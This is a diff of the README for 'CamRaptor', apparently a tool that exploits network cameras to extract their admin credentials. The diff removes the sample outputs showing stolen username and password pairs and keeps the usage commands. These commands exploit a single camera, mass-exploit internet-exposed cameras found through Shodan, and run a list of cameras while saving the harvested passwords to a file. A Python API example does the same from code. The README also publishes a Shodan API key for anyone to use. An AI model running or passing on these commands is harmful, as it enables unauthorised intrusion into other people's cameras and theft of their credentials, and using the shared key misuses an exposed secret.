@@ -44,14 +44,6 @@ Let's hack my camera just for fun.
 camraptor -a 192.168.99.100
 ```
 
-**output:**
-
-```shell
-[*] Exploiting 192.168.99.100...
-[+] (192.168.99.100) - admin:MySuperPassword
-[i] Exploit completed.
-```
-
 Let's try to use Shodan search engine to exploit cameras over Internet and save all obtained passwords to `passwords.txt`, we will use it with `-t` for fast exploitation.
 
 ```shell
@@ -60,15 +52,6 @@ camraptor -t --api PSKINdQe1GyxGgecYz2191H2JoS9qvgD -o passwords.txt
 
 **NOTE:** Given Shodan API key (`PSKINdQe1GyxGgecYz2191H2JoS9qvgD`) is my PRO API key, you can use this key or your own, be free to use all our resources for free :)
 
-**output:**
-
-```shell
-[*] Authorizing Shodan by given API key...
-[+] Authorization successfully completed!
-[*] Exploiting... (x.x.x.x) \
-[i] Exploit completed.
-```
-
 Let's try to use opened database of cameras with `-t` for fast exploitation.
 
 ```shell
@@ -76,13 +59,6 @@ camraptor -t -i cameras.txt -o passwords.txt
 ```
 
 **NOTE:** It will exploit all cameras in `cameras.txt` list by their addresses and save all obtained passwords to `passwords.txt`.
-
-**output:**
-
-```shell
-[*] Exploiting... (x.x.x.x) \
-[i] Exploit completed.
-```
 
 ## CamRaptor API
 
@@ -107,12 +83,6 @@ camraptor = CamRaptor()
 creds = camraptor.exploit('192.168.99.100')
 
 print(creds)
-```
-
-**output:**
-
-```shell
-('admin', 'mamahacker123')
 ```
 
 ## Other tools
